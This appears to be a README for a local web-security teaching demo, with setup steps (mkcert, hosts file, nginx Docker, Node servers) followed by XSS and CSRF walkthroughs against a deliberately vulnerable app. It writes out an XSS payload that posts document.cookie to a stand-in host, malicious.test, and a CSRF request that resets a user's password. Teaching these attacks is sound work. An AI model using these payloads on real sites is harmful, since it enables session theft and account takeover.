# Web security demo

## Project setup

##### Step 1. Install `mkcert`

In order to get `https` to work on local `.test` domains, we need to create TLS certificates.
Using `mkcert` we can do it very easily.

Look for appropriate installation guide as per your operating system. Once `mkcert` is installed, run following command in your projects `nginx/certs` directory.

```bash
mkcert codersgyan.test
mkcert api.codersgyan.test
mkcert malicious.test
```

Above commands will create private key and certificate. Nginx will use these certs to configure `https` protocol.

##### Step 2. Setup /etc/hosts

Add these domains to `/etc/hosts` file. For windows Os please find the appropriate instructions.

```bash
127.0.0.1	codersgyan.test
127.0.0.1	api.codersgyan.test
127.0.0.1	malicious.test
```

##### Step 3. Build the nginx docker image

Make sure, you are in nginx folder, then run following command:

```bash
docker build -t web-security .
```

##### Step 4. Run the nginx docker container

```bash
docker run --add-host=host.docker.internal:host-gateway \
 -p 80:80 -p 443:443 \
  web-security
```

##### Step 5. Create `.env` file

Rename the `.env.example` file into `.env` file.

You can use following command:

```bash
mv .env.example .env
```

##### Step 6. Install dependencies
In project root run following command to install all the node dependencies.

```bash
npm install
```

##### Step 7. Run backend servers

Now our nginx is running, we need to run malicious node server and api server.

Run following commands in 2 separate terminal windows.

```bash
# Terminal 1
node server-api.js

# Terminal 2
node malicious-server.js

```

Now you will be able to access following domains in the browser.

-   https://codersgyan.test
-   https://malicious.test
-   https://api.codersgyan.test

### XSS Example 1

1. Open `https://codersgyan.test` and click on login, it will login with pre-added username and password and stores access-token and refresh-token in your browsers cookie.

2. Now since user is logged in and cookies are available now if he clicks on this link `https://codersgyan.test/?search=<img src=x onerror="fetch('https://malicious.test/steal-cookie', {method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({cookies: document.cookie})})"></img>` from any social engineering. His cookies which are not HttpOnly will be stored in malicious-server in a `stolen-cookie.txt` file.

### XSS Example 2

1.  1. Open `https://api.codersgyan.test` and click on login, it will login with pre-added username and password and stores access-token and refresh-token in your browsers cookie.

2.  Now in the comment section add below code in the comment section and save it `https://codersgyan.test/?search=<img src=x onerror="fetch('https://malicious.test/steal-cookie', {method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({cookies: document.cookie})})"></img>`.

3.  If anyuser who logged in and open the webpage which loads the comment execute the script

### CSRF

1. Open `malicious.test` and it will make an api call to
   `fetch("https://api.codersgyan.test/forgot-password", {
    method: "POST",
    credentials: "include",
    headers: {
        "Content-Type": "application/json"
    },
    body: JSON.stringify({ email: "user@example.com", newPassword: "coders666" })
});` to change the password sending already set cookies if available.

2. Now password for the user will be changed
